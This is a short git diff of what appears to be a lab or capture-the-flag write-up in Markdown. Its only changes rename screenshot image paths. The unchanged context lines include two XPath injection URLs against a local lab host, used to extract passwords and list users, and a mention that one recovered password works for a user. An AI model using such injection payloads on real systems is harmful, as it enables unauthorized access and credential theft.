@@ -64,7 +64,7 @@ We can try XPath injection since it seems to load `xpath()`. I tested all forms 
 http://192.168.157.202/portal.php?work=car%27)]%20|%20//password%00&action=search
 ```
 
-<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I also found some users when testing payloads:
 
@@ -76,7 +76,7 @@ http://192.168.157.202/portal.php?work=car%27)%20or%201=1%20or%20(%27&action=sea
 
 The first password works for `bob`:
 
-<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (82) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
